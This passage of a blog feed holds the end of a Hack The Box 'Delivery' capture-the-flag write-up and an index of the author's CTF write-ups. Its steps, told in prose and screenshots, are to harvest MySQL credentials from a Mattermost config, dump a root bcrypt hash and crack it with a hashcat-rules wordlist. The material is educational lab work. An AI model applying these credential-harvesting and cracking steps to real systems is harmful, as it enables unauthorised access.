&lt;p&gt;It’s the verification code, sweet now we can verify our email address and simply login.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic16.png&quot; alt=&quot;helpdisk_mattermost_login&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now Let’s explore a bit, we click on internal and get into the channel we see there’s messages left by admin over there .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic2.png&quot; alt=&quot;helpdisk_mattermost_msg&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We see credentials , Swwwwwweet .let’s login via ssh .&lt;/p&gt;

&lt;p&gt;PS: I covered the credentials so you do the box instead of copying and pasting&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic27.png&quot; alt=&quot;helpdisk_mattermost_ssh&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And There we go , now we can read the user.txt&lt;/p&gt;

&lt;h2 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h2&gt;

&lt;p&gt;At This point it’s pretty straight forward , let’s run linpeas.sh and see what’s going on but there’s nothing.
let’s check &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt&lt;/code&gt; we can see mattermost installation let’s check it .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic12.png&quot; alt=&quot;helpdisk_logged_in1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;the first thing i do , is to check the configs since they usually store credentials , and sensitive information .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic15.png&quot; alt=&quot;helpdisk_logged_in1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Oh the config.json is interesting , let’s check it out&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic5.png&quot; alt=&quot;helpdisk_logged_config&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see there’s an mysql settings with some credentails , running ss -lnpt we see mysql is running .
Let’s Logging And Check The database.
PS: The password is a hint itself it says crack the mattermost password which is the root password&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic11.png&quot; alt=&quot;helpdisk_logged_mysql&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic20.png&quot; alt=&quot;helpdisk_logged_mysql2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ah there’s too many tables there , but we just interested in the Users tables.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic17.png&quot; alt=&quot;helpdisk_logged_mysql&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic28.png&quot; alt=&quot;helpdisk_logged_mysql1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic14.png&quot; alt=&quot;helpdisk_logged_mysql2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We have the root hash it’s a bcrypt type. now before we crack it, remember from the mattermost internal channel the admin user gave us a valuable hint .&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PleaseSubscribe! may not be in RockYou but if any hacker manages to get our hashes, they can use hashcat rules to easily crack all variations of common words or phrases.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This is a usefull hint to let us know that we should generate a wordlist from hashcat rules in order to crack the root hash through “PleaseSubscribe!”
Let’s go to our crackred and generate a wordlist .&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic21.png&quot; alt=&quot;helpdisk_crackred&quot; /&gt;&lt;/p&gt;

&lt;p&gt;that’s not a big wordlist , it should crack really fast. let’s crack our hash.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic13.png&quot; alt=&quot;helpdisk_crackred1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And there we goo , we’ve cracked it,took about 2 seconds , now let’s su to root.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://ybenel.cf/imgs/delivery/pic23.png&quot; alt=&quot;helpdisk_root&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And That’s it , that’s delivery hope you enjoyed the writeup take care and i’ll see you all other time.&lt;/p&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="HTB" /><category term="HTB" /><category term="Easy" /><summary type="html">Delivery Easy Box By Ippsec</summary></entry><entry><title type="html">CTF Write Ups</title><link href="/ctf/2020/10/19/writeups.html" rel="alternate" type="text/html" title="CTF Write Ups" /><published>2020-10-19T00:00:00+01:00</published><updated>2020-10-19T00:00:00+01:00</updated><id>/ctf/2020/10/19/writeups</id><content type="html" xml:base="/ctf/2020/10/19/writeups.html">&lt;h1 id=&quot;hacktober-ctf-2020&quot;&gt;Hacktober CTF (2020)&lt;/h1&gt;
&lt;p&gt;This CTF Was Quite Unpleasant Due To Sick Challenges And Worse Staff Ever!
Guessing Guessing Guessing !!! This Is Not CTF AnyMore !!&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Programming&lt;/th&gt;
      &lt;th&gt;Crypto&lt;/th&gt;
      &lt;th&gt;Steganography&lt;/th&gt;
      &lt;th&gt;Networking&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Message In a Array [10pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Hail Caesar! [10pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Ghost Hunter [10pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Evil Corp’s Child 3 [150pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Trick Or Treat [40pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Down The Wrong Path [10pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;You Believe In Ghosts? [30pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Hunted Mirror [125pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Cover Your Bases [30pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Blasphemy [40pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Red Rum [250pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Bone To Pick [80pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Start Digging [100pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Stairway To Hell [250pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Password Check [400pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h1 id=&quot;el-journadas-ctf-2020&quot;&gt;El Journadas CTF (2020)&lt;/h1&gt;
&lt;p&gt;This CTF Was Little Bit Good But Too Hard!
We Could Not Solve All The Challenges But We Did Great !&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Crypto&lt;/th&gt;
      &lt;th&gt;PWN&lt;/th&gt;
      &lt;th&gt;Networking&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Time Coding [200pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;ROP Style [400pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt;Still with insecure protocols [200pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Hide your stuff at plain sight [400pts] &lt;a href=&quot;https://blog.ybenel.cf&quot;&gt;Link&lt;/a&gt;&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</content><author><name>[&quot;ybenel&quot;]</name></author><category term="ctf" /><category term="ctf" /><category term="writeup" /><summary type="html">Hacktober CTF (2020) This CTF Was Quite Unpleasant Due To Sick Challenges And Worse Staff Ever! Guessing Guessing Guessing !!! This Is Not CTF AnyMore !!</summary></entry></feed>